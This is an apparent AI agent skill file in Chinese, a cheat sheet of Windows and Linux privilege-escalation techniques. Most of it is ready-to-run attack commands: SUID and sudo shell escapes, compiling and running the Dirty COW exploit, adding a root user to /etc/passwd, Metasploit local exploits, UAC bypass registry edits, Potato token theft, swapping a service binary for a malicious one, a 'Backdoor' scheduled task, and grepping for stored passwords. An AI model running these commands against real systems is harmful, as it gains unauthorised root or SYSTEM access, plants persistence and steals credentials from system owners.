---
name: privesc-privesc-detail
description: Use when encountering linux/windows权限提升技术
---

# 权限提升

## Info

- **Domain**: intranet
- **Tags**: intranet, privesc, privilege

补充

## 1. Windows提权

### 信息收集

```cmd
systeminfo
whoami /all
whoami /priv
net user username
net localgroup administrators
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 查找可利用服务

```cmd
sc query state=all
accesschk.exe -uwcqv "Authenticated Users" *
```

### AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

### 服务路径空格

```cmd
sc qc service_name
```

---

## 2. Linux提权

### 信息收集

```bash
uname -a
cat /etc/issue
id
whoami
sudo -l
find / -perm -4000 2>/dev/null
```

### SUID提权

```bash
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null

# 常见可利用SUID
/usr/bin/find
/usr/bin/vim
/usr/bin/less
/usr/bin/nano
```

### SUDO提权

```bash
# 检查sudo配置
sudo -l

# 利用
sudo su
sudo bash
sudo /bin/sh
```

### 内核漏洞

```bash
# 信息收集
uname -a                    # 全部信息
uname -r                    # 内核版本
cat /etc/issue              # 发行版版本
cat /etc/*-release          # 详细版本
cat /proc/version           # 内核编译信息

# 搜索漏洞
searchsploit linux kernel $(uname -r)
searchsploit -x linux/local/37088.c   # 查看 EXP 源码
searchsploit -m linux/local/37088.c   # 复制到当前目录

# 编译执行 C 语言 EXP
gcc -o exp 37088.c && chmod +x exp && ./exp
```

### CVE-2016-5195 Dirty Cow（脏牛）

**影响**: Linux kernel > 2.6.22 (2007) 且低于修复版本
- Centos7: 3.10.0-327.36.3.el7
- Ubuntu 16.04: 4.4.0-45.66
- Debian 8: 3.16.36-1+deb8u2

**原理**: 内存子系统 COW（写时复制）条件竞争，允许非特权用户写入只读文件（如 `/etc/passwd`）。

```bash
# Dirty Cow EXP
gcc -pthread dirty.c -o dirty -lcrypt
./dirty new_password
# 会自动修改 /etc/passwd，创建 firefart 用户（uid=0）
# 用完恢复: mv /tmp/bak /etc/passwd
```

### MSF local_exploit_suggester

```bash
# 已有 session 后
bg                                    # 后台挂起
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
# 输出可能的 EXP，如:
# linux/local/cve_2016_5195_dirty_cow
# linux/local/overlayfs_priv_esc

use exploit/linux/local/cve_2016_5195_dirty_cow
set SESSION 1
set LHOST <kali_ip>
set WritableDir /tmp
exploit
```

### SUID 提权（详细）

```bash
# 查找 SUID 文件
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# GTFOBins 查询: https://gtfobins.github.io/

# find 提权
find . -exec /bin/sh -p \; -quit

# bash 提权
bash -p

# vim 提权（添加 root 用户）
vim /etc/passwd
# 添加: bob:$1$salt$638tR8bROOvPnPklDQ9Vf/:0:0::/root:/bin/bash
# 密码 123456

# vim 交互 shell
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# python 提权
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# env 提权
env /bin/sh -p
```

### SUDO 提权（详细）

```bash
sudo -l    # 查看可用命令

# 一条命令
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo perl -e 'exec "/bin/sh";'
sudo find /etc/passwd -exec /bin/sh \;
sudo sed -n '1e exec sh 1>&0' /etc/passwd
sudo zip 2.zip 1.txt -T --unzip-command="sh -c /bin/sh"

# 两条命令（交互）
sudo git help config → !/bin/sh
sudo less /etc/hosts → !sh
sudo man man → !/bin/sh
sudo ftp → !/bin/sh
sudo ed → !/bin/sh

# 读文件
sudo cat /flag
sudo xxd /flag | xxd -r
sudo chmod 777 /flag
```

---

## 3. UAC绕过

### 方法1: SilentCleanup

```cmd
cmd /c set __COMPAT_LAYER=RunAsInvoker && reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 1 /f && explorer.exe
```

### 方法2: FodHelper

```powershell
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd /c calc" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /DelegateExecute "None"
```

### 方法3: CMSTP

```cmd
cmstp.exe /s /au
```

---

## 4. 令牌窃取

### Incognito

```bash
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### RottenPotato

```bash
rottenpotato.exe
```

### Juicy Potato

```bash
JuicyPotato.exe -l 1337 -p shell.exe -t *
```

---

## 5. 服务提权

### 可执行文件替换

```cmd
sc config ServiceName binPath= "malicious.exe"
sc start ServiceName
```

### 服务路径劫持

```cmd
sc qc service_name
# 检查路径是否有空格
```

---

## 6. DLL劫持

### 原理

- 查找高权限程序加载的DLL
- 在可写目录创建同名DLL

### 工具

```
Process Monitor
PowerUp.ps1
```

---

## 7. 计划任务提权

### 创建计划任务

```cmd
schtasks /create /tn "Backdoor" /tr "C:\shell.exe" /sc daily /st 09:00
```

### 利用现有任务

```cmd
schtasks /query /fo LIST /v
```

---

## 8. 令牌窃取与模拟

### SeImpersonatePrivilege

```bash
# Potato家族
JuicyPotato.exe
PrintSpoofer.exe
GodPotato.exe
```

---

## 9. 密码查找

### 敏感文件

```bash
# Windows
findstr /s /i password *.txt *.config *.xml
dir /s *pass*.txt

# Linux
grep -r "password" /etc/
find / -name "*password*"
```

### 配置文件

```bash
# 数据库配置
cat /var/www/html/config.php
cat /var/www/.env
```